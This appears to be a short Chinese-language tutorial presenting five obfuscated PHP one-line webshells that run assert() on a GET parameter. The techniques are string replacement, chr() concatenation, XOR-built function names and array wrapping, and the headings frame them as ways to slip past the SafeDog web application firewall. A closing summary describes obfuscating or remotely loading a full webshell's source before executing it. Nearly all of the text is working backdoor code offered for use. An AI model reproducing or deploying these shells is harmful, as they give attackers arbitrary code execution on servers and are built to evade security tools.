<b>0x01字符串变形</b>
使用substr_replace()替换
```php
<?php
$c=substr_replace("assexx",'rt','4');
[""=>$c($_GET[_])];
?>
```

<b>0x02特殊字符干扰</b>
```php
<?php
function demo($data){
    \assert($data);
}
demo($_GET[_]);
?>
```

<b>0x03变形回调函数</b>
```php
<?php
function demo($a,$s,$s1,$e,$r,$t){
    $jg=$a.$s.$s1.$e.$r.$t;
    [array(""=>$jg($_GET[_]))];
}
demo(chr(97),chr(115),chr(115),chr(101),chr(114),chr(116))
?>
```

<b>0x04数组过狗</b>
```php
<?php
$b="assexx";
$c=str_replace("xx","rt",$b);
[""=>$c($_GET[_])];
?>
```

<b>0x05无字符马</b>
```php
<?php
$a=(chr(65)^chr(32)).(chr(83)^chr(32)).(chr(83)^chr(32)).(chr(5)^chr(96)).(chr(82)^chr(32)).(chr(84)^chr(32));
$b='_'.(chr('103')^chr(32)).(chr(101)^chr(32)).(chr(116)^chr(32));
$c=$$b;
["By pass D"=>$a($c[_])];
?>
```

总结：
加密大马源码，通过混淆或干扰的方式或在远程读取的方式来读取源码并用混淆的方式来执行大马的源码